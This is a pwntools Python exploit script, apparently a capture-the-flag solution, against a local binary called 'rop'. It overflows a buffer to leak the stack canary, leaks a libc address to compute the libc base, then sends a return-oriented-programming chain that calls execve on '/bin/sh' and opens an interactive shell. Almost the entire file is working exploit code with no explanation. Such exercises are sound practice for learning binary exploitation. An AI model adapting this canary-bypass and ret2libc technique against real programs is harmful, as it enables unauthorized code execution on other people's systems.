#!/bin/python
from pwn import *
exe = ELF('./rop')
p = process(exe.path)
context.terminal = ['alacritty', '-e']

gdb.attach(p, gdbscript='''
b*main+204
c
           c
           b*main+235
           c
           
           ''')
#################exploiting#####################

pop_rsi = 0x0000000000400851 
got_setvbuf = 0x601040
pop_rax = 0x000000000040066d 
pop_rdi = 0x0000000000400853
rw_section = 0x0000000000601148
payload = b'a'*56
p.sendlineafter(b'Buf: ',payload)
p.recvuntil(b'a'*56)
leak_canary = int(str(hex(u64(p.recv(8)))).encode()[:-1] + str("0").encode(),16)
log.info(f'leak_canary: ' + hex(leak_canary))

payload = b'a'*56 
payload += p64(leak_canary)
payload += b'a'*8
payload += p64(exe.symbols['main'])
p.sendafter(b'Buf: ',payload)



#part 2 

payload = b'a'*224
p.sendafter(b'Buf: ',payload)
p.recvuntil(b'a'*224)
leak_addr = u64(p.recv(6) + b'\x00\x00')
base_libc = leak_addr  -163210 
bin_sh_leak = base_libc + 0x19ae34
log.info(f'leak_addr: ' + hex(leak_addr))
log.info(f'base_lib: ' + hex(base_libc))
execve_libc_bin_sh = base_libc + 325481 
log.info(f'execve_libc_bin_sh: ' + hex(execve_libc_bin_sh))
payload = b'a'*56 
payload += p64(leak_canary)
payload += p64(0)
payload += p64(pop_rdi) + p64(bin_sh_leak)
payload += p64(execve_libc_bin_sh)
p.sendafter(b'Buf: ',payload)

##############the end###########################
p.interactive()
